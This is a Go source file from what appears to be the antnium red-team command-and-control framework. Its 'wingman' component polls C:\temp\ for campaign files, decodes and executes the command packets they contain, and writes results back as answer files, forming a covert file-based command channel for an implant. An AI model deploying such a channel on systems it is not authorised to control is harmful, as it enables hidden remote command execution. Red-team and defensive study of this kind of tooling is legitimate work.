package wingman

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"time"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/executor"

	log "github.com/sirupsen/logrus"
)

type WingDirectory struct {
	wingmanData campaign.WingmanData
	directory   string
}

func MakeWingDirectory() WingDirectory {
	wing := WingDirectory{
		campaign.MakeWingmanData(),
		"C:\\temp\\",
	}
	return wing
}

func (wd WingDirectory) Start(destination string) {
	// Always delete old one on start, or we will be confused
	os.Remove(wd.directory + wd.wingmanData.Req())

	// Loop forever
	wd.loop()
}

func (wd WingDirectory) loop() {
	r, err := regexp.Compile(".*\\." + wd.wingmanData.FileExtension)
	if err != nil {
		log.Fatalf("Regex: %s", err.Error())
	}
	for {
		files, err := ioutil.ReadDir(wd.directory)
		if err != nil {
			log.Error(err)
			return
		}

		for _, f := range files {
			if r.MatchString(f.Name()) {
				path := wd.directory + f.Name()
				err := wd.handleFile(path)
				if err != nil {
					log.Errorf("When handling file: %s: %s", path, err.Error())
				}

				// Delete file always
				os.Remove(path)
			}
		}

		time.Sleep(100 * time.Millisecond)
	}
}

func (wd WingDirectory) handleFile(filename string) error {
	executor := executor.MakeExecutor()

	// Handle it
	log.Infof("Reading file: %s", filename)
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	fmt.Println("WingDirectory: HandleFile(): Read: ")

	packet, err := DecodePacket(string(data))
	if err != nil {
		return fmt.Errorf("Wingman: Error: %s", err.Error())
	}

	// Execute
	packet, err = executor.Execute(packet)
	if err != nil {
		log.WithFields(log.Fields{
			"packet": packet,
			"error":  err,
		}).Info("Wingman: Error executing packet")

		// TODO ERR
	}

	// Write answer
	packetEncoded, err := EncodePacket(packet)
	if err != nil {
		log.Error("Wingman: Error: ", err.Error())
	}
	path := wd.directory + wd.wingmanData.Ans()
	err = os.WriteFile(path, packetEncoded, 0644)
	if err != nil {
		return err
	}
	log.Infof("Finished writing answer: %s", packetEncoded)

	return nil
}
